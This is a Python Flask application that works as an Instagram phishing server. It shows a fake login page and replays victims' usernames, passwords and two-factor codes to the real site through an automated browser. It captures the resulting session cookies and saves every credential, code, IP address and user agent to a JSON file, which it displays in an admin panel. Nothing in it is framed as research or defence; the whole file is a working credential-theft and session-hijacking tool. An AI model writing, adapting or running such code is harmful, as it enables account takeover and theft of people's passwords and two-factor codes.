from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime, timedelta
import json
import os
import time
import secrets
import shutil 

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

CAPTURE_FILE = 'captured_credentials.json'
MAX_INPUT_LENGTH = 150
ADMIN_USERNAME = os.getenv('ADMIN_USER', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASS', 'admin') 

active_drivers = {}

def validate_input(field_name, value, max_length=MAX_INPUT_LENGTH):
    if not value:
        return f"{field_name} is required."
    if len(value) > max_length:
        return f"{field_name} must be at most {max_length} characters."
    return None

def save_credentials(username, password, session_id=None, two_fa_code=None, status="captured"):
    try:
        data = []
        if os.path.exists(CAPTURE_FILE):
            try:
                with open(CAPTURE_FILE, 'r') as f:
                    content = f.read().strip()
                    if content:  
                        data = json.loads(content)
                    else:
                        print(f"[DEBUG] {CAPTURE_FILE} is empty, starting fresh")
            except json.JSONDecodeError as e:
                print(f"[DEBUG] JSON decode error in existing file: {e}")
                print(f"[DEBUG] Creating backup and starting fresh")
                if os.path.exists(CAPTURE_FILE):
                    os.rename(CAPTURE_FILE, f"{CAPTURE_FILE}.backup")
                data = []
        
        entry = {
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'password': password,
            'session_id': session_id,
            'two_fa_code': two_fa_code,
            'status': status,
            'ip_address': request.remote_addr,
            'user_agent': request.headers.get('User-Agent')
        }
        
        data.append(entry)
        
        with open(CAPTURE_FILE, 'w') as f:
            json.dump(data, f, indent=4)
        
        print(f"[DEBUG] Saved credentials to {CAPTURE_FILE}: {status}")
        return True
    except Exception as e:
        print(f"[DEBUG] Error saving credentials: {e}")
        import traceback
        traceback.print_exc()
        return False

def get_captured_data():
    try:
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE, 'r') as f:
                content = f.read().strip()
                if content:  
                    return json.loads(content)
                else:
                    print(f"[DEBUG] {CAPTURE_FILE} is empty")
                    return []
        print(f"[DEBUG] {CAPTURE_FILE} does not exist")
        return []
    except json.JSONDecodeError as e:
        print(f"[DEBUG] JSON decode error reading captured data: {e}")
        return []
    except Exception as e:
        print(f"[DEBUG] Error reading captured data: {e}")
        return []

def create_driver(session_id):
    chrome_options = Options()

    unique_user_dir = f"/tmp/chrome-session-{session_id}"
    chrome_options.add_argument(f"--user-data-dir={unique_user_dir}")
    
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-notifications")
    chrome_options.add_argument("--window-size=1920,1080")
    
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def cleanup_driver(session_id):
    if session_id in active_drivers:
        try:
            print(f"[DEBUG] Cleaning up driver for session: {session_id}")
            active_drivers[session_id].quit()
        except Exception as e:
            print(f"[DEBUG] Error during driver quit: {e}")
        
        unique_user_dir = f"/tmp/chrome-session-{session_id}"
        try:
            if os.path.exists(unique_user_dir):
                shutil.rmtree(unique_user_dir)
                print(f"[DEBUG] Removed user data dir: {unique_user_dir}")
        except Exception as e:
            print(f"[DEBUG] Error removing user data dir {unique_user_dir}: {e}")
        
        del active_drivers[session_id]
        print(f"[DEBUG] Remaining active drivers: {list(active_drivers.keys())}")



def attempt_instagram_login(username, password, session_id):
    try:
        driver = create_driver(session_id)
        active_drivers[session_id] = driver
        print(f"[DEBUG] Created driver for session: {session_id}")
        print(f"[DEBUG] Active drivers after creation: {list(active_drivers.keys())}")
        
        driver.get("https://www.instagram.com/")
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        
        username_field = driver.find_element(By.NAME, "username")
        username_field.send_keys(username)
        
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        password_field.send_keys(password)
        
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
        )
        login_button.click()
        
        time.sleep(5)
        
        try:
            error_elements = driver.find_elements(By.CSS_SELECTOR, "p#slfErrorAlert, div.xkmlbd1")
            for element in error_elements:
                error_text = element.text.strip()
                if error_text:
                    save_credentials(username, password, status="failed_login")
                    cleanup_driver(session_id)
                    
                    if "password was incorrect" in error_text.lower():
                        return {"status": "error", "message": "Sorry, your password was incorrect."}
                    elif "doesn't belong to an account" in error_text.lower():
                        return {"status": "error", "message": "The username you entered doesn't belong to an account."}
                    elif "wait a few minutes" in error_text.lower():
                        return {"status": "error", "message": "Too many attempts. Please wait a few minutes."}
                    else:
                        return {"status": "error", "message": error_text}
        except:
            pass
        
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "verificationCode"))
            )
            save_credentials(username, password, status="2fa_required")
            return {"status": "2fa_required", "message": "Two-factor authentication required"}
        except:
            pass
        
        try:
            cookies = driver.get_cookies()
            session_cookie = next((c['value'] for c in cookies if c['name'] == 'sessionid'), None)
            
            if session_cookie:
                save_credentials(username, password, session_id=session_cookie, status="success")
                cleanup_driver(session_id)
                return {
                    "status": "success", 
                    "message": "Login successful",
                    "session_id": session_cookie
                }
        except:
            pass
        
        cleanup_driver(session_id)
        return {"status": "error", "message": "An unexpected error occurred."}
        
    except Exception as e:
        cleanup_driver(session_id)
        print(f"Login error: {e}")
        return {"status": "error", "message": f"An error occurred: {str(e)}"}

def verify_2fa_code(session_id, code, username, password):
    if session_id not in active_drivers:
        print(f"[DEBUG] Session {session_id} not found in active_drivers")
        print(f"[DEBUG] Active drivers: {list(active_drivers.keys())}")
        return {"status": "error", "message": "Session expired. Please login again from the beginning."}
    
    driver = active_drivers[session_id]
    
    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "verificationCode"))
        )
        code_input.clear()
        code_input.send_keys(code)
        
        confirm_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='button']"))
        )
        confirm_button.click()
        
        time.sleep(5)
        
        try:
            error = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.ID, "twoFactorErrorAlert"))
            )
            save_credentials(username, password, two_fa_code=code, status="2fa_failed")
            return {"status": "error", "message": "Invalid security code. Please try again."}
        except:
            pass
        
        cookies = driver.get_cookies()
        session_cookie = next((c['value'] for c in cookies if c['name'] == 'sessionid'), None)
        
        if session_cookie:
            save_credentials(username, password, session_id=session_cookie, 
                           two_fa_code=code, status="2fa_success")
            cleanup_driver(session_id)
            return {
                "status": "success",
                "message": "Verification successful",
                "session_id": session_cookie
            }
        
        cleanup_driver(session_id)
        return {"status": "error", "message": "Verification failed."}
        
    except Exception as e:
        cleanup_driver(session_id)
        print(f"2FA error: {e}")
        return {"status": "error", "message": f"An error occurred: {str(e)}"}


@app.route('/')
def index():
    """Main login page"""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login attempt"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    error = validate_input("Username", username) or validate_input("Password", password)
    if error:
        return render_template('login.html', error=error)
    
    if 'user_session_id' not in session:
        user_session_id = secrets.token_hex(16)
        session['user_session_id'] = user_session_id
        print(f"[DEBUG] Created NEW session: {user_session_id}")
    else:
        user_session_id = session['user_session_id']
        print(f"[DEBUG] Using EXISTING session: {user_session_id}")
    
    session['username'] = username
    session['password'] = password
    session.permanent = True 
    
    print(f"[DEBUG] Session data: {dict(session)}")
    
    result = attempt_instagram_login(username, password, user_session_id)
    
    print(f"[DEBUG] Login result: {result}")
    print(f"[DEBUG] Active drivers after login: {list(active_drivers.keys())}")
    
    if result['status'] == '2fa_required':
        return redirect(url_for('two_factor'))
    elif result['status'] == 'success':
        return redirect('instagram.com')
    else:
        return render_template('login.html', error=result['message'])

@app.route('/2fa')
def two_factor():
    if 'user_session_id' not in session:
        print("[DEBUG] No user_session_id in session - redirecting to index")
        return redirect(url_for('index'))
    
    print(f"[DEBUG] 2FA page - session_id: {session.get('user_session_id')}")
    print(f"[DEBUG] Active drivers: {list(active_drivers.keys())}")
    
    if session['user_session_id'] not in active_drivers:
        print(f"[DEBUG] Driver not found for session: {session['user_session_id']}")
        return render_template('2fa.html', error="Session lost. Please go back and login again.")
    
    return render_template('2fa.html')

@app.route('/verify', methods=['POST'])
def verify():
    try:
        print(f"[DEBUG] Verify called - session keys: {list(session.keys())}")
        print(f"[DEBUG] Session user_session_id: {session.get('user_session_id')}")
        print(f"[DEBUG] Active drivers: {list(active_drivers.keys())}")
        
        if 'user_session_id' not in session:
            print("[DEBUG] No user_session_id in session")
            return render_template('2fa.html', error="Session expired. Please login again.")
        
        code = request.form.get('code', '').strip()
        print(f"[DEBUG] Received 2FA code: {code}")
        
        error = validate_input("Security code", code, max_length=10)
        if error:
            print(f"[DEBUG] Validation error: {error}")
            return render_template('2fa.html', error=error)
        
        if session['user_session_id'] not in active_drivers:
            print(f"[DEBUG] Driver NOT FOUND for session: {session['user_session_id']}")
            return render_template('2fa.html', error="Browser session lost. Please start over from login page.")
        
        print("[DEBUG] Calling verify_2fa_code...")
        result = verify_2fa_code(
            session['user_session_id'],
            code,
            session.get('username'),
            session.get('password')
        )
        
        print(f"[DEBUG] verify_2fa_code returned: {result}")
        
        if result['status'] == 'success':
            print("[DEBUG] 2FA verification successful, clearing session")
            session.clear()
            return redirect('instagram.com')
        else:
            print(f"[DEBUG] 2FA verification failed: {result['message']}")
            return render_template('2fa.html', error=result['message'])
            
    except Exception as e:
        print(f"[DEBUG] Exception in verify route: {e}")
        import traceback
        traceback.print_exc()
        return render_template('2fa.html', error=f"An error occurred: {str(e)}")

@app.route('/adminpage')
def admin_login():
    return render_template('admin.html')

@app.route('/admin/auth', methods=['POST'])
def admin_auth():
    username = request.form.get('admin_user', '').strip()
    password = request.form.get('admin_pass', '').strip()
    
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        session['admin_authenticated'] = True
        return redirect(url_for('admin_panel'))
    
    return render_template('admin.html', error="Invalid credentials")

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin_authenticated'):
        return redirect(url_for('admin_login'))
    
    data = get_captured_data()
    return render_template('admin_panel.html', captures=data)

@app.route('/admin/api/data')
def admin_api_data():
    if not session.get('admin_authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = get_captured_data()
    return jsonify(data)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_authenticated', None)
    return redirect(url_for('admin_login'))

@app.errorhandler(404)
def not_found(e):
    return redirect(url_for('index'))

@app.errorhandler(500)
def server_error(e):
    return "Internal Server Error", 500


import atexit

@atexit.register
def cleanup_all_drivers():
    print("[DEBUG] Application shutting down - cleaning up all drivers")
    for sid in list(active_drivers.keys()):
        cleanup_driver(sid)


import colorama
from colorama import Fore, Style
import time
import os

colorama.init()

def print_slow_ascii_art():
    ascii_art = [
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⢠⢤⣠⣶⣿⣿⡿⠿⠛⠛⠛⠛⠉⠛⠛⠛⠛⠿⣷⡦⠞⣩⣶⣸⡆⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⣠⣾⡤⣌⠙⠻⣅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⢀⣾⣿⣿⠃⣇⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⣠⣾⣿⡟⢇⢻⣧⠄⠀⠈⢓⡢⠴⠒⠒⠒⠒⡲⠚⠁⠀⠐⣪⣿⣿⡿⡄⣿⣷⡄⠀⠀⠀⠀⠀",
        "⠀⠀⠀⣠⣿⣿⠟⠁⠸⡼⣿⡂⠀⠀⠈⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠹⣿⣧⢳⡏⠹⣷⡄⠀⠀⠀⠀",
        "⠀⠀⣰⣿⡿⠃⠀⠀⠀⢧⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠇⡸⠀⠀⠘⢿⣦⣄⠀⠀",
        "⠀⢰⣿⣿⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⠈⣿⣿⣆⠀",
        "⠀⣿⣿⡇⠀⠀⠀⠀⢰⠇⠀⢺⡇⣄⠀⠀⠀⠀⣤⣶⣀⣿⠃⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠸⣿⣿⡀",
        "⢸⣿⣿⠀⠀⠀⠀⠀⢽⠀⢀⡈⠉⢁⣀⣀⠀⠀⠀⠉⣉⠁⠀⠀⠀⣀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⡇",
        "⢸⣿⡟⠀⠀⠀⠠⠀⠈⢧⡀⠀⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠠⢀⠀⠀⠀⠀⠀⢼⠁⠀⠀⠀⠀⠀⢹⣿⡇",
        "⢸⣿⣿⠀⠀⠀⠀⠀⠠⠀⠙⢦⣀⠠⠊⠉⠂⠄⠀⠀⠀⠈⠀⠀⠀⣀⣤⣤⡾⠘⡆⠀⠀⠀⠀⠀⣾⣿⡇",
        "⠘⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢠⠜⠳⣤⡀⠀⠀⣀⣤⡤⣶⣾⣿⣿⣿⠟⠁⠀⠀⡸⢦⣄⠀⠀⢀⣿⣿⠇",
        "⠀⢿⣿⣧⠀⠀⠀⠀⠀⣠⣤⠞⠀⠀⠀⠙⠁⠙⠉⠀⠀⠸⣛⡿⠉⠀⠀⠀⢀⡜⠀⠀⠈⠙⠢⣼⣿⡿⠀",
        "⠀⠈⣿⣿⣆⠀⠀⢰⠋⠡⡇⠀⡀⣀⣤⢢⣤⣤⣀⠀⠀⣾⠟⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⣰⣿⣿⠁⠀",
        "⠀⠀⠈⢿⣿⣧⣀⡇⠀⡖⠁⢠⣿⣿⢣⠛⣿⣿⣿⣷⠞⠁⠀⠀⠈⠫⡉⠁⠀⠀⠀⠀⢀⣼⣿⠿⠃⠀⠀",
        "⠀⠀⠀⠈⠻⣿⣿⣇⡀⡇⠀⢸⣿⡟⣾⣿⣿⣿⣿⠋⠀⠀⠀⢀⡠⠊⠁⠀⠀⠀⢀⣠⣿⠏⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⣀⢸⣿⢻⠛⣿⣿⡿⠁⠀⠀⣀⠔⠉⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣼⣿⣿⣟⠀⠀⡠⠊⠀⣀⣀⣠⣴⣶⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⣿⣿⣶⣶⣷⣶⣶⡿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    ]
    
    for line in ascii_art:
        print(Fore.RED + line + Style.RESET_ALL)
        time.sleep(0.2) 
    
    time.sleep(3)
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Fore.RED + "\n".join(ascii_art) + Style.RESET_ALL)

if __name__ == '__main__':
    print_slow_ascii_art()
    
    app.run(
         host='0.0.0.0',
         port=5000,
         debug=False 
    )
